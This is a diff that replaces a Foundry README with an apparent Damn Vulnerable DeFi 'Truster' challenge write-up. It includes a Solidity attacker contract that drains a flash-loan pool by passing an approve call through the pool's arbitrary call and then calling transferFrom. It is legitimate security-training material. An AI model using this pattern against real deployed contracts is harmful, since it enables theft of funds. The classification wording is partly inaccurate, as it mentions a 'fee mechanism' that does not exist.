@@ -1,66 +1,40 @@
-## Foundry
+# Truster
 
-**Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust.**
+## Challenge
 
-Foundry consists of:
+More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.
 
--   **Forge**: Ethereum testing framework (like Truffle, Hardhat and DappTools).
--   **Cast**: Swiss army knife for interacting with EVM smart contracts, sending transactions and getting chain data.
--   **Anvil**: Local Ethereum node, akin to Ganache, Hardhat Network.
--   **Chisel**: Fast, utilitarian, and verbose solidity REPL.
+The pool holds 1 million DVT tokens. You have nothing.
 
-## Documentation
+To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.
 
-https://book.getfoundry.sh/
+## Solution
 
-## Usage
+I passed token address as the target address and the approve function for the arbitrary function call,after which I used the transferFrom function to send the tokens to the recovery account.
 
-### Build
+```
+contract Attacker {
+    uint256 constant TOKENS_IN_POOL = 1_000_000e18;
 
-```shell
-$ forge build
+    constructor(TrusterLenderPool pool,address _token,address recovery){
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)",address(this),TOKENS_IN_POOL);
+        pool.flashLoan(0,address(this), _token,data);
+        DamnValuableToken token = DamnValuableToken(_token);
+        token.transferFrom(address(pool),recovery,TOKENS_IN_POOL);
+    }
+}
 ```
 
-### Test
+![Alt text](images/truster.png)
 
-```shell
-$ forge test
-```
+## Attack Classification
 
-### Format
+### Economic Exploit
+The attack exploits the fee mechanism to drain funds economically by making an arbitrary call.
 
-```shell
-$ forge fmt
-```
+### DoS (Denial of Service)
+Draining the pool,denies other users who might want to access the flashloan from getting any tokens.
 
-### Gas Snapshots
+### Access Control Misconfiguration
+The root cause of the vulnerability lies in poor access control: the pool delegates sensitive operations (arbitrary function calls) to untrusted borrowers.
 
-```shell
-$ forge snapshot
-```
-
-### Anvil
-
-```shell
-$ anvil
-```
-
-### Deploy
-
-```shell
-$ forge script script/Counter.s.sol:CounterScript --rpc-url <your_rpc_url> --private-key <your_private_key>
-```
-
-### Cast
-
-```shell
-$ cast <subcommand>
-```
-
-### Help
-
-```shell
-$ forge --help
-$ anvil --help
-$ cast --help
-```
